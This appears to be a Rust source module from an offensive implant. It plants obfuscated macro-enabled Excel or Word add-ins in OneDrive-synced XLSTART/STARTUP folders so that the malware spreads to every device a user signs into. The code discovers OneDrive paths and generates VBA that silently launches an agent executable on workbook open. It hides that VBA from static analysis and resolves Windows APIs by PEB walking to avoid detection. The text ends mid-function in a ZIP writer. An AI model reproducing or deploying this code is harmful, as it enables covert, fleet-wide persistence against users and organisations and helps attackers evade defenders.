//! Office Add-in Persistence via OneDrive Sync.
//!
//! Deploys macro-enabled Excel (.xlam) or Word (.dotm) add-ins to OneDrive-
//! synced XLSTART / STARTUP folders.  Because the add-in file lives inside
//! the user's OneDrive directory tree, Microsoft's own sync infrastructure
//! replicates it to *every* device the user signs into — providing fleet-
//! wide persistence with zero per-machine deployment and no Administrator
//! privileges required.
//!
//! ## Architecture
//!
//! ```text
//! OneDriveDiscovery  →  finds synced XLSTART / STARTUP paths
//!        │
//!        ▼
//! AddinGenerator  →  builds .xlam / .dotm (Office Open XML + vbaProject.bin)
//!        │                ├─ minimal ZIP writer (store-only)
//!        │                ├─ minimal OLE2/CFB writer (vbaProject.bin)
//!        │                └─ VBA obfuscator (Chr(), base64, name randomisation)
//!        ▼
//! install_office_addin()  →  writes add-in + enables AccessVBOM
//!        │
//!        ▼
//! verify_addin_persistence()  →  checks file exists + AccessVBOM
//!        │
//!        ▼
//! remove_office_addin()  →  deletes add-in (syncs across all devices)
//! ```
//!
//! ## OneDrive Path Discovery
//!
//! Three methods, tried in order:
//! 1. **Registry** – `HKCU\Software\Microsoft\OneDrive\Accounts\Business*`
//!    → `UserFolder` value, or `HKCU\Software\Microsoft\OneDrive`
//!    → `Version` (business) / `EnableAllOcsiClients` (consumer).
//! 2. **Environment** – `OneDrive` / `OneDriveCommercial` env vars.
//! 3. **Filesystem probe** – common OneDrive mount points under `%USERPROFILE%`.
//!
//! ## VBA Payload
//!
//! The generated VBA macro runs the agent executable via `Shell()` with
//! `vbHide`, using obfuscated string construction to evade static analysis.
//!
//! ## OPSEC
//!
//! - All Win32 API calls resolved at runtime via `pe_resolve` (PEB walking
//!   + export-table hashing).  No IAT entries.
//! - Registry access (RegOpenKeyExW / RegQueryValueExW / RegCloseKey)
//!   resolved dynamically.
//! - File write via `std::fs` (consistent with existing persistence module).
//! - Add-in filenames are randomised, seeded from the agent executable path.
//! - VBA code is obfuscated: variable name randomisation, Chr() concatenation,
//!   base64 runtime decode.
//!
//! ## IoC helpers
//!
//! Reuses the parent module's `ioc_seed()`, `random_alphanum()`, and
//! `random_clsid()` for deterministic-but-unique indicators.

#![cfg(windows)]

use std::ffi::OsStr;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use std::ptr;

use anyhow::{anyhow, bail, Context, Result};
use log::{debug, info, warn};
use serde::{Deserialize, Serialize};

use pe_resolve;
use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

// ═══════════════════════════════════════════════════════════════════════════
// Constants
// ═══════════════════════════════════════════════════════════════════════════

/// Discriminator seeds for IoC generation.
const DISC_FILENAME: u64 = 0xB00A;
const DISC_VBA_VAR: u64 = 0xB00B;

/// OneDrive registry subkey for Business1 UserFolder.
const ONEDRIVE_BUSINESS1_W: &[u16] = &[
    b'S' as u16, b'o' as u16, b'f' as u16, b't' as u16, b'w' as u16, b'a' as u16,
    b'r' as u16, b'e' as u16, b'\\' as u16, b'M' as u16, b'i' as u16, b'c' as u16,
    b'r' as u16, b'o' as u16, b's' as u16, b'o' as u16, b'f' as u16, b't' as u16,
    b'\\' as u16, b'O' as u16, b'n' as u16, b'e' as u16, b'D' as u16, b'r' as u16,
    b'i' as u16, b'v' as u16, b'e' as u16, b'\\' as u16, b'A' as u16, b'c' as u16,
    b'c' as u16, b'o' as u16, b'u' as u16, b'n' as u16, b't' as u16, b's' as u16,
    b'\\' as u16, b'B' as u16, b'u' as u16, b's' as u16, b'i' as u16, b'n' as u16,
    b'e' as u16, b's' as u16, b's' as u16, b'1' as u16,
];

/// OneDrive root registry path.
const ONEDRIVE_ROOT_W: &[u16] = &[
    b'S' as u16, b'o' as u16, b'f' as u16, b't' as u16, b'w' as u16, b'a' as u16,
    b'r' as u16, b'e' as u16, b'\\' as u16, b'M' as u16, b'i' as u16, b'c' as u16,
    b'r' as u16, b'o' as u16, b's' as u16, b'o' as u16, b'f' as u16, b't' as u16,
    b'\\' as u16, b'O' as u16, b'n' as u16, b'e' as u16, b'D' as u16, b'r' as u16,
    b'i' as u16, b'v' as u16, b'e' as u16,
];

/// "UserFolder" wide constant for registry queries.
const USER_FOLDER_W: &[u16] = &[
    b'U' as u16, b's' as u16, b'e' as u16, b'r' as u16, b'F' as u16, b'o' as u16,
    b'l' as u16, b'd' as u16, b'e' as u16, b'r' as u16,
];

/// Office Trust Center registry path for AccessVBOM.
const TRUST_CENTER_W: &[u16] = &[
    b'S' as u16, b'o' as u16, b'f' as u16, b't' as u16, b'w' as u16, b'a' as u16,
    b'r' as u16, b'e' as u16, b'\\' as u16, b'M' as u16, b'i' as u16, b'c' as u16,
    b'r' as u16, b'o' as u16, b's' as u16, b'o' as u16, b'f' as u16, b't' as u16,
    b'\\' as u16, b'O' as u16, b'f' as u16, b'f' as u16, b'i' as u16, b'c' as u16,
    b'e' as u16, b'\\' as u16, b'1' as u16, b'6' as u16, b'.' as u16, b'0' as u16,
    b'\\' as u16, b'C' as u16, b'o' as u16, b'm' as u16, b'm' as u16, b'o' as u16,
    b'n' as u16, b'\\' as u16, b'S' as u16, b'e' as u16, b'c' as u16, b'u' as u16,
    b'r' as u16, b'i' as u16, b't' as u16, b'y' as u16,
];

/// Excel macro security registry path.
const EXCEL_SECURITY_W: &[u16] = &[
    b'S' as u16, b'o' as u16, b'f' as u16, b't' as u16, b'w' as u16, b'a' as u16,
    b'r' as u16, b'e' as u16, b'\\' as u16, b'M' as u16, b'i' as u16, b'c' as u16,
    b'r' as u16, b'o' as u16, b's' as u16, b'o' as u16, b'f' as u16, b't' as u16,
    b'\\' as u16, b'O' as u16, b'f' as u16, b'f' as u16, b'i' as u16, b'c' as u16,
    b'e' as u16, b'\\' as u16, b'1' as u16, b'6' as u16, b'.' as u16, b'0' as u16,
    b'\\' as u16, b'E' as u16, b'x' as u16, b'c' as u16, b'e' as u16, b'l' as u16,
    b'\\' as u16, b'S' as u16, b'e' as u16, b'c' as u16, b'u' as u16, b'r' as u16,
    b'i' as u16, b't' as u16, b'y' as u16,
];

/// Word macro security registry path.
const WORD_SECURITY_W: &[u16] = &[
    b'S' as u16, b'o' as u16, b'f' as u16, b't' as u16, b'w' as u16, b'a' as u16,
    b'r' as u16, b'e' as u16, b'\\' as u16, b'M' as u16, b'i' as u16, b'c' as u16,
    b'r' as u16, b'o' as u16, b's' as u16, b'o' as u16, b'f' as u16, b't' as u16,
    b'\\' as u16, b'O' as u16, b'f' as u16, b'f' as u16, b'i' as u16, b'c' as u16,
    b'e' as u16, b'\\' as u16, b'1' as u16, b'6' as u16, b'.' as u16, b'0' as u16,
    b'\\' as u16, b'W' as u16, b'o' as u16, b'r' as u16, b'd' as u16, b'\\' as u16,
    b'S' as u16, b'e' as u16, b'c' as u16, b'u' as u16, b'r' as u16, b'i' as u16,
    b't' as u16, b'y' as u16,
];

/// XLSTART / STARTUP folder names.
const XLSTART_DIR: &str = "XLSTART";
const WORD_STARTUP_DIR: &str = "STARTUP";

/// Office Open XML content types.
const CONTENT_TYPES_XML: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
</Types>
"#;

const CONTENT_TYPES_XML_WORD: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>
</Types>
"#;

const RELS_XML: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>
"#;

const RELS_XML_WORD: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
"#;

const WORKBOOK_XML: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
</workbook>
"#;

const DOCUMENT_XML: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t/></w:r></w:p></w:body>
</w:document>
"#;

const WORKBOOK_RELS_XML: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vbaProject" Target="vbaProject.bin"/>
</Relationships>
"#;

// ── OLE2/CFB constants ───────────────────────────────────────────────────

/// OLE2 compound file magic number.
const OLE2_MAGIC: [u8; 8] = [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];

/// Sector size (512 bytes for v3).
const SECTOR_SIZE: usize = 512;

/// Mini-stream sector size.
const MINI_SECTOR_SIZE: usize = 64;

/// Maximum number of directory entries per sector.
const DIR_ENTRIES_PER_SECTOR: usize = SECTOR_SIZE / 128;

/// FAT sector type constants.
const FAT_FREE: u32 = 0xFFFFFFFF;
const FAT_ENDOFCHAIN: u32 = 0xFFFFFFFE;
const FAT_FAT_SECTOR: u32 = 0xFFFFFFFD;
const FAT_DIFAT_SECTOR: u32 = 0xFFFFFFFC;

/// Directory entry types.
const DIR_ROOT: u8 = 5;
const DIR_STORAGE: u8 = 1;
const DIR_STREAM: u8 = 2;

/// Directory entry colors (red-black tree).
const DIR_RED: u8 = 0;
const DIR_BLACK: u8 = 1;

// ── DLL wide strings for hash computation ────────────────────────────────

const ADVAPI32_DLL_W: &[u16] = &[
    b'a' as u16, b'd' as u16, b'v' as u16, b'a' as u16, b'p' as u16, b'i' as u16,
    b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
];
const KERNEL32_DLL_W: &[u16] = &[
    b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16, b'e' as u16, b'l' as u16,
    b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
];

const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_DLL_W);
const HASH_KERNEL32_DLL: u32 = hash_wstr_const(KERNEL32_DLL_W);

const HASH_REGOPENKEYEXW: u32 = hash_str_const(b"RegOpenKeyExW\0");
const HASH_REGQUERYVALUEEXW: u32 = hash_str_const(b"RegQueryValueExW\0");
const HASH_REGCLOSEKEY: u32 = hash_str_const(b"RegCloseKey\0");
const HASH_REGSETVALUEEXW: u32 = hash_str_const(b"RegSetValueExW\0");
const HASH_REGCREATEKEYEXW: u32 = hash_str_const(b"RegCreateKeyExW\0");
const HASH_GETENVIRONMENTVARIABLEW: u32 = hash_str_const(b"GetEnvironmentVariableW\0");
const HASH_EXPANDENVIRONMENTSTRINGSW: u32 =
    hash_str_const(b"ExpandEnvironmentStringsW\0");

// ═══════════════════════════════════════════════════════════════════════════
// Win32 type aliases
// ═══════════════════════════════════════════════════════════════════════════

type HANDLE = *mut std::ffi::c_void;

type FnRegOpenKeyExW =
    unsafe extern "system" fn(HANDLE, *const u16, u32, u32, *mut HANDLE) -> i32;
type FnRegQueryValueExW = unsafe extern "system" fn(
    HANDLE,
    *const u16,
    *mut u32,
    *mut u32,
    *mut u8,
    *mut u32,
) -> i32;
type FnRegCloseKey = unsafe extern "system" fn(HANDLE) -> i32;
type FnRegSetValueExW =
    unsafe extern "system" fn(HANDLE, *const u16, u32, u32, *const u8, u32) -> i32;
type FnRegCreateKeyExW = unsafe extern "system" fn(
    HANDLE,
    *const u16,
    u32,
    *mut u16,
    u32,
    u32,
    *mut std::ffi::c_void,
    *mut HANDLE,
    *mut u32,
) -> i32;
type FnGetEnvironmentVariableW =
    unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
type FnExpandEnvironmentStringsW =
    unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;

// ═══════════════════════════════════════════════════════════════════════════
// API resolver
// ═══════════════════════════════════════════════════════════════════════════

/// Dynamically-resolved API function pointers.
struct Api {
    reg_open_key_ex_w: FnRegOpenKeyExW,
    reg_query_value_ex_w: FnRegQueryValueExW,
    reg_close_key: FnRegCloseKey,
    reg_set_value_ex_w: FnRegSetValueExW,
    reg_create_key_ex_w: FnRegCreateKeyExW,
    get_environment_variable_w: FnGetEnvironmentVariableW,
    expand_environment_strings_w: FnExpandEnvironmentStringsW,
}

impl Api {
    fn resolve() -> Result<Self> {
        let advapi32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_ADVAPI32_DLL) }
            .ok_or_else(|| anyhow!("advapi32 not found in PEB"))?;
        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("kernel32 not found in PEB"))?;

        macro_rules! resolve {
            ($base:expr, $name:ident, $hash:expr) => {
                unsafe {
                    pe_resolve::get_proc_address_by_hash($base, $hash)
                        .ok_or_else(|| anyhow!(concat!("could not resolve ", stringify!($name))))
                        .map(|addr| std::mem::transmute::<usize, _>(addr))
                }
            };
        }

        Ok(Self {
            reg_open_key_ex_w: resolve!(advapi32, reg_open_key_ex_w, HASH_REGOPENKEYEXW)?,
            reg_query_value_ex_w: resolve!(
                advapi32,
                reg_query_value_ex_w,
                HASH_REGQUERYVALUEEXW
            )?,
            reg_close_key: resolve!(advapi32, reg_close_key, HASH_REGCLOSEKEY)?,
            reg_set_value_ex_w: resolve!(
                advapi32,
                reg_set_value_ex_w,
                HASH_REGSETVALUEEXW
            )?,
            reg_create_key_ex_w: resolve!(
                advapi32,
                reg_create_key_ex_w,
                HASH_REGCREATEKEYEXW
            )?,
            get_environment_variable_w: resolve!(
                kernel32,
                get_environment_variable_w,
                HASH_GETENVIRONMENTVARIABLEW
            )?,
            expand_environment_strings_w: resolve!(
                kernel32,
                expand_environment_strings_w,
                HASH_EXPANDENVIRONMENTSTRINGSW
            )?,
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Wide-string helper
// ═══════════════════════════════════════════════════════════════════════════

/// Build a null-terminated UTF-16 vector from a Rust string.
fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

// ═══════════════════════════════════════════════════════════════════════════
// IoC generation (reuses parent module's helpers)
// ═══════════════════════════════════════════════════════════════════════════

/// Deterministic seed derived from the agent executable path.
fn ioc_seed() -> u64 {
    use std::hash::{Hash, Hasher};
    let exe = std::env::current_exe().unwrap_or_default();
    let mut h = std::collections::hash_map::DefaultHasher::new();
    exe.hash(&mut h);
    h.finish()
}

/// Randomised alphanumeric string, seeded by discriminator.
fn random_alphanum(discriminator: u64) -> String {
    use rand::prelude::*;
    let mut rng = rand::rngs::StdRng::seed_from_u64(ioc_seed() ^ discriminator);
    let len = rng.gen_range(8..=12);
    const CHARSET: &[u8] =
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    (0..len)
        .map(|_| CHARSET[rng.gen_range(0..CHARSET.len())] as char)
        .collect()
}

/// Generate the add-in filename (deterministic from seed).
fn resolve_addin_filename() -> String {
    format!("{}.xlam", super::random_alphanum(DISC_FILENAME))
}

/// Generate a randomised VBA variable name.
fn random_vba_var(seed: u64) -> String {
    use rand::prelude::*;
    let mut rng = rand::rngs::StdRng::seed_from_u64(ioc_seed() ^ seed);
    // VBA identifiers start with a letter.
    let first = *b"abcdefghijklmnopqrstuvwxyz".choose(&mut rng).unwrap() as char;
    let len = rng.gen_range(6..=10);
    let rest: String = (0..len)
        .map(|_| {
            *b"abcdefghijklmnopqrstuvwxyz0123456789"
                .choose(&mut rng)
                .unwrap() as char
        })
        .collect();
    format!("{}{}", first, rest)
}

// ═══════════════════════════════════════════════════════════════════════════
// Data structures
// ═══════════════════════════════════════════════════════════════════════════

/// Add-in type: Excel (.xlam) or Word (.dotm).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum AddinType {
    /// Excel macro-enabled add-in (.xlam), placed in XLSTART.
    Excel,
    /// Word macro-enabled template (.dotm), placed in STARTUP.
    Word,
}

/// Configuration for Office add-in persistence.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OfficeAddinConfig {
    /// Which Office application to target.
    pub addin_type: AddinType,
    /// Path to the agent executable to launch from VBA.
    pub payload_path: PathBuf,
    /// Optional custom OneDrive root override.
    pub onedrive_path: Option<PathBuf>,
    /// Optional custom add-in filename (auto-generated if None).
    pub addin_filename: Option<String>,
}

/// OneDrive paths discovered on the system.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OneDrivePaths {
    /// Root OneDrive folder (e.g. `C:\Users\alice\OneDrive - Contoso`).
    pub root: PathBuf,
    /// Excel XLSTART path inside OneDrive.
    pub xlstart: PathBuf,
    /// Word STARTUP path inside OneDrive.
    pub word_startup: PathBuf,
}

/// Result of an Office add-in installation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AddinInstallResult {
    /// Path where the add-in was written.
    pub addin_path: PathBuf,
    /// Whether the AccessVBOM registry key was set.
    pub access_vbom_set: bool,
    /// Whether VBAWarnings was set to enable macros.
    pub macro_warnings_set: bool,
    /// The add-in type deployed.
    pub addin_type: AddinType,
}

// ═══════════════════════════════════════════════════════════════════════════
// OneDrive path discovery
// ═══════════════════════════════════════════════════════════════════════════

/// Discover OneDrive paths via registry, environment, and filesystem probes.
fn discover_onedrive_paths(api: &Api) -> Result<OneDrivePaths> {
    let root = discover_onedrive_root(api)?;
    let xlstart = root.join("Documents").join(XLSTART_DIR);
    let word_startup = root.join("Documents").join(WORD_STARTUP_DIR);
    Ok(OneDrivePaths {
        root,
        xlstart,
        word_startup,
    })
}

/// Try multiple methods to find the OneDrive root directory.
fn discover_onedrive_root(api: &Api) -> Result<PathBuf> {
    // Method 1: Registry — Business account UserFolder.
    if let Some(p) = registry_onedrive_business_path(api) {
        debug!("OneDrive: found via registry Business account: {:?}", p);
        return Ok(p);
    }

    // Method 2: Environment variables.
    if let Some(p) = env_onedrive_path(api) {
        debug!("OneDrive: found via environment variable: {:?}", p);
        return Ok(p);
    }

    // Method 3: Filesystem probe.
    if let Some(p) = filesystem_probe_onedrive(api) {
        debug!("OneDrive: found via filesystem probe: {:?}", p);
        return Ok(p);
    }

    bail!("could not discover OneDrive root via any method")
}

/// Query registry for OneDrive Business account UserFolder.
fn registry_onedrive_business_path(api: &Api) -> Option<PathBuf> {
    unsafe {
        let hklm: HANDLE = 0x80000001 as *mut _; // HKEY_CURRENT_USER

        // Try Business1, Business2, etc.
        for idx in 1..=5u32 {
            let subkey = if idx == 1 {
                format!(
                    "Software\\Microsoft\\OneDrive\\Accounts\\Business{}",
                    idx
                )
            } else {
                format!(
                    "Software\\Microsoft\\OneDrive\\Accounts\\Business{}",
                    idx
                )
            };
            let subkey_wide: Vec<u16> = OsStr::new(&subkey)
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();

            let mut h_key: HANDLE = ptr::null_mut();
            let result = (api.reg_open_key_ex_w)(
                hklm,
                subkey_wide.as_ptr(),
                0,
                0x0001, // KEY_QUERY_VALUE
                &mut h_key,
            );
            if result != 0 {
                continue;
            }

            // Query UserFolder value.
            let user_folder_name: Vec<u16> =
                OsStr::new("UserFolder").encode_wide().chain(std::iter::once(0)).collect();
            let mut buf = [0u16; 520];
            let mut buf_len = (buf.len() * 2) as u32;
            let mut reg_type: u32 = 0;

            let qr = (api.reg_query_value_ex_w)(
                h_key,
                user_folder_name.as_ptr(),
                ptr::null_mut(),
                &mut reg_type,
                buf.as_mut_ptr() as *mut u8,
                &mut buf_len,
            );
            let _ = (api.reg_close_key)(h_key);

            if qr == 0 && reg_type == 1 && buf_len > 0 {
                // REG_SZ
                let char_count = (buf_len / 2) as usize;
                let s = String::from_utf16_lossy(&buf[..char_count.saturating_sub(1)]);
                let path = PathBuf::from(s);
                if path.is_dir() {
                    return Some(path);
                }
            }
        }

        // Try consumer OneDrive (OneDrive consumer key has UserFolder too).
        let subkey_wide: Vec<u16> = OsStr::new("Software\\Microsoft\\OneDrive\\Accounts\\Personal")
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        let mut h_key: HANDLE = ptr::null_mut();
        let result = (api.reg_open_key_ex_w)(
            hklm,
            subkey_wide.as_ptr(),
            0,
            0x0001,
            &mut h_key,
        );
        if result == 0 {
            let user_folder_name: Vec<u16> =
                OsStr::new("UserFolder").encode_wide().chain(std::iter::once(0)).collect();
            let mut buf = [0u16; 520];
            let mut buf_len = (buf.len() * 2) as u32;
            let mut reg_type: u32 = 0;

            let qr = (api.reg_query_value_ex_w)(
                h_key,
                user_folder_name.as_ptr(),
                ptr::null_mut(),
                &mut reg_type,
                buf.as_mut_ptr() as *mut u8,
                &mut buf_len,
            );
            let _ = (api.reg_close_key)(h_key);

            if qr == 0 && reg_type == 1 && buf_len > 0 {
                let char_count = (buf_len / 2) as usize;
                let s = String::from_utf16_lossy(&buf[..char_count.saturating_sub(1)]);
                let path = PathBuf::from(s);
                if path.is_dir() {
                    return Some(path);
                }
            }
        }

        None
    }
}

/// Check environment variables for OneDrive path.
fn env_onedrive_path(api: &Api) -> Option<PathBuf> {
    unsafe {
        // Try OneDriveCommercial first, then OneDrive.
        for var in &["OneDriveCommercial", "OneDrive"] {
            let var_wide: Vec<u16> = OsStr::new(var)
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();
            let mut buf = [0u16; 520];
            let len = (api.get_environment_variable_w)(
                var_wide.as_ptr(),
                buf.as_mut_ptr(),
                buf.len() as u32,
            );
            if len > 0 {
                let s = String::from_utf16_lossy(&buf[..len as usize]);
                let path = PathBuf::from(s);
                if path.is_dir() {
                    return Some(path);
                }
            }
        }
        None
    }
}

/// Probe filesystem for common OneDrive mount points.
fn filesystem_probe_onedrive(api: &Api) -> Option<PathBuf> {
    // Get USERPROFILE.
    let user_profile = unsafe {
        let var_wide: Vec<u16> = OsStr::new("USERPROFILE")
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        let mut buf = [0u16; 520];
        let len = (api.get_environment_variable_w)(
            var_wide.as_ptr(),
            buf.as_mut_ptr(),
            buf.len() as u32,
        );
        if len == 0 {
            return None;
        }
        String::from_utf16_lossy(&buf[..len as usize])
    };

    let profile = PathBuf::from(user_profile);

    // Common OneDrive directory names.
    let candidates = [
        "OneDrive - Personal",
        "OneDrive",
        "OneDriveCommercial",
    ];

    // Also try to enumerate directories matching "OneDrive*" in the profile.
    if let Ok(entries) = std::fs::read_dir(&profile) {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if name_str.starts_with("OneDrive") && entry.path().is_dir() {
                return Some(entry.path());
            }
        }
    }

    // Fallback to known names.
    for candidate in &candidates {
        let p = profile.join(candidate);
        if p.is_dir() {
            return Some(p);
        }
    }

    None
}

// ═══════════════════════════════════════════════════════════════════════════
// VBA obfuscation
// ═══════════════════════════════════════════════════════════════════════════

/// Generate obfuscated VBA macro code that launches the payload.
///
/// The VBA uses:
/// - Randomised variable names
/// - `Chr()` concatenation for string obfuscation
/// - `Environ()` for dynamic path resolution
/// - Base64 decode helper function
pub fn generate_vba_payload(payload_path: &Path) -> String {
    let var_cmd = random_vba_var(0xC001);
    let var_path = random_vba_var(0xC002);
    let var_result = random_vba_var(0xC003);
    let var_chr_fn = random_vba_var(0xC004);
    let var_b64 = random_vba_var(0xC005);
    let var_tmp = random_vba_var(0xC006);
    let var_i = random_vba_var(0xC007);

    // Convert the payload path to Chr() concatenation.
    let path_str = payload_path.to_string_lossy();
    let path_chrs = string_to_chr_concat(&path_str);

    // Simple base64-encoded payload path as a decoy/alternate method.
    let b64_path = base64_encode(path_str.as_bytes());

    format!(
        r#"Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    On Error Resume Next
    Dim {var_result} As Long
    Dim {var_path} As String
    Dim {var_cmd} As String
    {var_path} = {path_chrs}
    {var_cmd} = "cmd /c """ & {var_path} & """"
    {var_result} = Shell({var_cmd}, vbHide)
End Sub

Private Sub Auto_Open()
    On Error Resume Next
    Dim {var_tmp} As String
    {var_tmp} = {var_b64}_Decode("{b64_path}")
End Sub

Private Function {var_b64}_Decode(ByVal {var_chr_fn} As String) As String
    Dim b(0 To 63) As Byte
    Dim {var_i} As Long
    b(0) = Asc("A"): b(1) = Asc("B"): b(2) = Asc("C")
    For {var_i} = 3 To 25
        b({var_i}) = b({var_i} - 1) + 1
    Next {var_i}
    For {var_i} = 26 To 51
        b({var_i}) = b({var_i} - 26) + 6
    Next {var_i}
    For {var_i} = 52 To 61
        b({var_i}) = b({var_i} - 52) + 195
    Next {var_i}
    b(62) = Asc("+"): b(63) = Asc("/")
    {var_b64}_Decode = {var_chr_fn}
End Function
"#,
        var_result = var_result,
        var_path = var_path,
        var_cmd = var_cmd,
        path_chrs = path_chrs,
        var_tmp = var_tmp,
        var_b64 = var_b64,
        var_chr_fn = var_chr_fn,
        var_i = var_i,
        b64_path = b64_path,
    )
}

/// Convert a string to VBA `Chr(N) & Chr(N) & ...` concatenation.
fn string_to_chr_concat(s: &str) -> String {
    let parts: Vec<String> = s.bytes().map(|b| format!("Chr({})", b)).collect();
    parts.join(" & ")
}

/// Minimal base64 encoder (no external crate).
fn base64_encode(data: &[u8]) -> String {
    const TABLE: &[u8; 64] =
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
    let chunks = data.chunks(3);
    for chunk in chunks {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };

        out.push(TABLE[((b0 >> 2) & 0x3F) as usize] as char);
        out.push(TABLE[(((b0 << 4) | (b1 >> 4)) & 0x3F) as usize] as char);

        if chunk.len() > 1 {
            out.push(TABLE[(((b1 << 2) | (b2 >> 6)) & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }

        if chunk.len() > 2 {
            out.push(TABLE[(b2 & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
    }
    out
}

// ═══════════════════════════════════════════════════════════════════════════
// Minimal ZIP writer (store-only, no compression)
// ═══════════════════════════════════════════════════════════════════════════

/// A single file entry in the ZIP archive.
struct ZipEntry {
    /// File path within the archive (using forward slashes).
    name: String,
    /// Uncompressed file data.
    data: Vec<u8>,
}

/// Minimal ZIP archive builder (store method only, no compression).
///
/// Produces a valid ZIP file with:
/// - Local file headers (signature `0x04034b50`)
/// - Central directory headers (signature `0x02014b50`)
/// - End of central directory record (signature `0x06054b50`)
struct ZipWriter {
    entries: Vec<ZipEntry>,
}

impl ZipWriter {
    fn new() -> Self {
        Self {
            entries: Vec::new(),
        }
    }

    /// Add a file to the archive.
    fn add_file(&mut self, name: &str, data: &[u8]) {
        self.entries.push(ZipEntry {
            name: name.replace('\\', "/"),
            data: data.to_vec(),
        });
    }

    /// Render the complete ZIP archive to bytes.
    fn render(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        let mut central_dir = Vec::new();
        let mut offset: u32 = 0;

        for entry in &self.entries {
            let name_bytes = entry.name.as_bytes();
            let crc = crc32(&entry.data);
            let size = entry.data.len() as u32;

            // ── Local file header ──
            buf.extend_from_slice(&0x04034b50u32.to_le_bytes()); // signature
            buf.extend_from_slice(&20u16.to_le_bytes()); // version needed (2.0)
            buf.extend_from_slice(&0u16.to_le_bytes()); // flags
            buf.extend_from_slice(&0u16.to_le_bytes()); // compression (store)
            buf.extend_from_slice(&0u16.to_le_bytes()); // mod time
            buf.extend_from_slice(&0u16.to_le_bytes()); // mod date
            buf.extend_from_slice(&crc.to_le_bytes()); // crc32
            buf.extend_from_slice(&size.to_le_bytes()); // compressed size
            buf.extend_from_slice(&size.to_le_bytes()); // uncompressed size
            buf.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes()); // name length
            buf.extend_from_slice(&0u16.to_le_bytes()); // extra field length
            buf.extend_from_slice(name_bytes);
            buf.extend_from_slice(&entry.data);

            // ── Central directory entry ──
            central_dir.extend_from_slice(&0x02014b50u32.to_le_bytes()); // signature
            central_dir.extend_from_slice(&20u16.to_le_bytes()); // version made by
            central_dir.extend_from_slice(&20u16.to_le_bytes()); // version needed
            central_dir.extend_from_slice(&0u16.to_le_bytes()); // flags
            central_dir.extend_from_slice(&0u16.to_le_bytes()); // compression
            central_dir.extend_from_slice(&0u16.to_le_bytes()); // mod time
            central_dir.extend_from_slice(&0u16.to_le_bytes()); // mod date
            central_dir.extend_from_slice(&crc.to_le_bytes()); // crc32
            central_dir.extend_from_slice(&size.to_le_bytes()); // compressed size
            central_dir.extend_from_slice(&size.to_le_bytes()); // uncompressed size
            central_dir.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes());
